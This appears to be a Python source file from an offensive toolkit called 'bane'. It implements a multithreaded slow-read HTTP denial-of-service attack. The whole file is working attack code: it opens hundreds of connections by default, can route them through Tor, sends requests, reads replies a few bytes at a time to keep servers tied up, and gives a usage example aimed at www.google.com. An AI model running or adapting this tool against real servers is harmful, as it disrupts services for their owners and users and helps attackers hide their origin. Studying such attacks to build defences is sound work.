from bane.ddos.utils import *
"""
   this tool is to perform slow reading attack. i read about this type of attacks on: https://blog.qualys.com/tag/slow-http-attack and tried to do the same thing in python (but in a better way though :p ). on this attack, the attacker is sending a full legitimate HTTP request but reading it slowly to keep the connection open as long as possible. here im doing it a bit different of the original attack with slowhttptest, im sending a normal HTTP request on each thread then read a small part of it (between 1 to 3 bytes randomly sized) then it sleeps for few seconds (3 to 5 seconds randomly sized too), then it sends another request and keep doing the same and keeping the connection open forever.

   it takes the following parameters:

   u: target ip or domain
   p: (set by default to: 80)
   threads: (set by default to: 500) number of connections
   timeout: (set by default to: 5) connection timeout flag 

   example:

   >>>import bane
   >>>bane.slow_read_attack('www.google.com',p=443,threads=300,timeout=7)

"""


class slow_read(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        cookie=None,
        user_agents=None,
        paths=["/"],
        threads_daemon=True,
        threads=500,
        timeout=5,
        min_speed=3,
        max_speed=5,
        max_read=3,
        min_read=1,
        logs=False,
        tor=False,
        duration=60,
    ):
        self.counter = 0
        self.cookie = cookie
        self.user_agents = user_agents
        if not self.user_agents or len(self.user_agents) == 0:
            self.user_agents = ua
        self.stop = False
        self.target = u
        self.port = p
        self.paths = paths
        self.timeout = timeout
        self.tor = tor
        self.read_max = max_read
        self.read_min = min_read
        self.min_speed = min_speed
        self.max_speed = max_speed
        self.logs = logs
        self.duration = duration
        self.start = time.time()
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) >= self.duration
                ):  # this is a safety mechanism so the attack won't run forever
                    break
                if self.stop == True:
                    break
                try:
                    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                    if self.tor == False:
                        s.settimeout(self.timeout)
                    if self.tor == True:
                        s.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
                    s.connect((self.target, self.port))
                    if (self.port == 443) or (self.port == 8443):
                        s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
                    while True:
                        if (
                            int(time.time() - self.start) >= self.duration
                        ):  # this is a safety mechanism so the attack won't run forever
                            break
                        if self.stop == True:
                            break
                        try:
                            s.send(
                                setup_http_packet(
                                    self.target,
                                    3,
                                    self.paths,
                                    2,
                                    8,
                                    10,
                                    50,
                                    self.cookie,
                                    self.user_agents,
                                ).encode("utf-8")
                            )
                            self.counter += 1
                            while True:
                                d = s.recv(random.randint(self.read_min, self.read_max))
                                if self.logs == True:
                                    sys.stdout.write(
                                        "\rReceived: {}   ".format(
                                            str(d.decode("utf-8").strip())
                                        )
                                    )
                                    sys.stdout.flush()
                                    # print("Received: {}".format(str(d.decode('utf-8'))))
                            time.sleep(random.randint(self.min_speed, self.max_speed))
                        except:
                            break
                    s.close()
                except:
                    pass
            self.kill()
        except:
            pass
